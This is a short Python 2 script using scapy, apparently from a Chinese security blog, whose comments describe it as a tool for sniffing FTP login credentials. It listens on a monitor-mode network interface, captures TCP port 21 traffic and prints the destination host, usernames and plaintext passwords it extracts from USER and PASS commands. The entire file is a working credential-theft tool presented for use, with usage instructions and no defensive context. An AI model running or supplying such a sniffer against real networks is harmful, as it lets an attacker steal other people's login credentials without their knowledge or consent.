#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/19
# Created by 冰河
# Description 嗅探FTP登录口令
#             用法：python wireless_ftp.py -i <处于监听模式的网卡>
# 博客 https://blog.csdn.net/l1028386804

import optparse
from scapy.all import *

#嗅探FTP数据包
def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    #将二进制包复制到raw变量
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP Login to ' + str(dest))
        print('[+] User account: ' + str(user[0]))
    elif pswd:
        print('[+] Password: ' + str(pswd[0]))

#主函数
def main():
    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface
        try:
            sniff(filter='tcp port 21', prn=ftpSniff)
        except KeyboardInterrupt:
            exit(0)

#程序入口
if __name__ == '__main__':
    main()

